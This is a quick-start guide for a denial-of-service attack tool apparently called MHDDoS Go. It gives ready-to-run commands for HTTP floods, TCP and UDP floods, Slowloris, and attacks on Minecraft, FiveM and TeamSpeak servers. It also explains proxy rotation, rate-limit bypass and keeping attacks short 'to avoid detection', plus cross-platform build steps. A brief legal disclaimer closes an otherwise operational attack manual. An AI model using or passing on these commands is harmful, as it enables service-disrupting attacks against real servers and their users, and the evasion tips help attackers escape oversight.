# MHDDoS Go - Quick Start Examples

## Installation

### Option 1: Download Pre-built Binary

```bash
# Download the binary for your platform
wget https://github.com/mhdthariq/MHDDoS/releases/download/v2.4/mhddos-linux-amd64
chmod +x mhddos-linux-amd64
./mhddos-linux-amd64 HELP
```

### Option 2: Build from Source

```bash
git clone https://github.com/mhdthariq/MHDDoS.git
cd MHDDoS
make build
./mhddos HELP
```

## Basic Usage Examples

### 1. Simple GET Flood (No Proxies)

```bash
./mhddos GET http://example.com 0 100 none.txt 50 60
```

This will:
- Use GET method
- Target: http://example.com
- 100 threads
- 50 requests per connection
- Run for 60 seconds
- No proxies (proxy file doesn't need to exist if type is 0)

### 2. POST Flood with SOCKS5 Proxies

```bash
./mhddos POST http://example.com 5 200 socks5.txt 100 120
```

This will:
- Use POST method
- Load SOCKS5 proxies from files/proxies/socks5.txt
- 200 threads
- 100 requests per connection
- Run for 120 seconds

### 3. TCP Flood (Layer 4)

```bash
./mhddos TCP 192.168.1.1:80 500 60
```

This will:
- Use TCP flood
- Target: 192.168.1.1 port 80
- 500 threads
- Run for 60 seconds

### 4. UDP Flood

```bash
./mhddos UDP 192.168.1.1:53 300 60
```

This will:
- Use UDP flood
- Target DNS server at 192.168.1.1
- 300 threads
- Run for 60 seconds

### 5. Minecraft Server Attack

```bash
./mhddos MINECRAFT play.example.com:25565 100 120
```

This will:
- Attack Minecraft server
- Use protocol handshake packets
- 100 threads
- Run for 120 seconds

### 6. Slow HTTP (Slowloris)

```bash
./mhddos SLOW http://example.com 0 50 none.txt 100 300
```

This will:
- Use Slowloris technique
- Keep connections open
- 50 threads
- Run for 300 seconds

### 7. FiveM Server Attack

```bash
./mhddos FIVEM 192.168.1.1:30120 200 60
```

This will:
- Attack FiveM game server
- 200 threads
- Run for 60 seconds

### 8. TeamSpeak 3 Server Attack

```bash
./mhddos TS3 192.168.1.1:9987 150 60
```

This will:
- Attack TeamSpeak 3 server
- 150 threads
- Run for 60 seconds

## Advanced Usage

### Using Proxy Files

1. Create proxy file in `files/proxies/`:

```bash
mkdir -p files/proxies
cat > files/proxies/http.txt <<EOF
1.2.3.4:8080
5.6.7.8:3128
9.10.11.12:8888
EOF
```

2. Use the proxy file:

```bash
./mhddos GET http://example.com 1 100 http.txt 50 60
```

### Proxy Types

- `0` = All types (random selection)
- `1` = HTTP/HTTPS proxies
- `4` = SOCKS4 proxies
- `5` = SOCKS5 proxies
- `6` = Random selection from available types

### Optimization Tips

1. **Thread Count**:
   - Start with 100-500 for testing
   - Go can handle 1000-5000+ threads efficiently
   - Monitor system resources

2. **Requests Per Connection (RPC)**:
   - Lower (10-50): More connection overhead, bypasses some rate limits
   - Higher (50-200): More efficient, higher load per connection

3. **Duration**:
   - Short tests: 60-120 seconds
   - Stress tests: 300-600 seconds
   - Don't run indefinitely to avoid detection

## Interactive Tools Console

```bash
./mhddos TOOLS
```

Available commands:
- `HELP` - Show available tools
- `DSTAT` - System statistics (not yet implemented)
- `CHECK` - Check website status (not yet implemented)
- `PING` - Ping servers (not yet implemented)
- `CLEAR` - Clear screen
- `EXIT` - Exit console

## Performance Monitoring

During attack, you'll see output like:

```
2024/01/01 12:00:00 Starting Layer7 attack: GET -> http://example.com with 100 threads for 60 seconds
2024/01/01 12:00:01 Target: example.com, Method: GET, PPS: 5.23k, BPS: 2.15 MiB / 1.67%
2024/01/01 12:00:02 Target: example.com, Method: GET, PPS: 5.45k, BPS: 2.23 MiB / 3.33%
```

Where:
- PPS = Packets (Requests) Per Second
- BPS = Bytes Per Second
- % = Progress percentage

## Building for Different Platforms

### Linux (AMD64)

```bash
GOOS=linux GOARCH=amd64 go build -o mhddos-linux main.go
```

### Windows

```bash
GOOS=windows GOARCH=amd64 go build -o mhddos.exe main.go
```

### macOS (Intel)

```bash
GOOS=darwin GOARCH=amd64 go build -o mhddos-mac main.go
```

### macOS (Apple Silicon)

```bash
GOOS=darwin GOARCH=arm64 go build -o mhddos-mac-arm main.go
```

### Raspberry Pi (ARM)

```bash
GOOS=linux GOARCH=arm64 go build -o mhddos-pi main.go
```

## Troubleshooting

### "Cannot resolve hostname"

Make sure the target hostname is correct and accessible:

```bash
ping example.com
```

### "Permission denied" (for raw socket methods)

Some methods (SYN, ICMP, amplification) need root:

```bash
sudo ./mhddos SYN 192.168.1.1:80 100 60
```

### Low performance

1. Increase thread count
2. Use faster proxies
3. Check system resources
4. Reduce RPC value

### "No such file or directory" for proxy file

Create the directory first:

```bash
mkdir -p files/proxies
```

## Safety & Legal Notice

⚠️ **WARNING**: This tool is for educational and authorized testing purposes only!

- Only test systems you own or have explicit permission to test
- Unauthorized attacks are illegal in most jurisdictions
- The developers are not responsible for misuse

## Getting Help

- Check the documentation: README-GO.md
- Compare with Python version: COMPARISON.md
- Review the code: All code is open source

## Next Steps

1. Read the full documentation in README-GO.md
2. Review available attack methods in the help output
3. Test on your own infrastructure first
4. Monitor system resources during attacks
5. Adjust parameters based on results
